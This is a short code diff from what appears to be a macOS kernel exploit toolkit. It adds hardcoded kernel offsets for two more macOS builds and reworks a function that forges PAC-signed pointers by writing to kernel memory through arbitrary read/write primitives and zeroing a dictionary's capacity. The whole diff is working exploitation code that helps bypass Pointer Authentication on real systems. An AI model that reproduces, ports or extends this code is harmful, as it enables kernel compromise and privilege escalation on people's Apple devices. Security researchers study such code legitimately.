@@ -27,6 +27,12 @@
 #elif defined(MACOS_21C52)
 #define LR_ENSURE_CAPACITY_KFREE 0xfffffe00079114a4
 #define LR_LCK_RW_LOCK_EXCLUSIVE_GEN 0xfffffe00072b9e54
+#elif defined(MACOS_21D49)
+#define LR_ENSURE_CAPACITY_KFREE 0xfffffe000790f100
+#define LR_LCK_RW_LOCK_EXCLUSIVE_GEN 0xfffffe00072b9e00
+#elif defined(MACOS_21E5212f)
+#define LR_ENSURE_CAPACITY_KFREE 0xfffffe0007920b98
+#define LR_LCK_RW_LOCK_EXCLUSIVE_GEN 0xfffffe00072c9660
 #else
 #error "unknown platform"
 #endif
@@ -173,10 +179,20 @@ int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *o
     uintptr_t x23 = lr_lck_rw_excl_gen - 0x30; // pacda ctx
 
     uintptr_t dict = xe_kmem_read_uint64(x19, 0);
-    xe_kmem_write_uint64(x20, 0, ptr);
     xe_kmem_write_uint64(x23, 0, ctx);
+    
+    // TODO: fix
+#if defined(MACOS_21E5212f)
+    uintptr_t reg_pacda_ptr = x21;
+    uintptr_t reg_dict_capacity = x20;
+#else
+    uintptr_t reg_pacda_ptr = x20;
+    uintptr_t reg_dict_capacity = x21;
+#endif
+    
+    xe_kmem_write_uint64(reg_pacda_ptr, 0, ptr);
     /// set the new capacity of dict as 0 so that the newly signed pointer will not be used
-    xe_kmem_write_uint64(x21, 0, 0);
+    xe_kmem_write_uint64(reg_dict_capacity, 0, 0);
     
     xe_util_lck_rw_lock_done(&util_lck_rw);
     dispatch_semaphore_wait(sem_add_value_complete, DISPATCH_TIME_FOREVER);
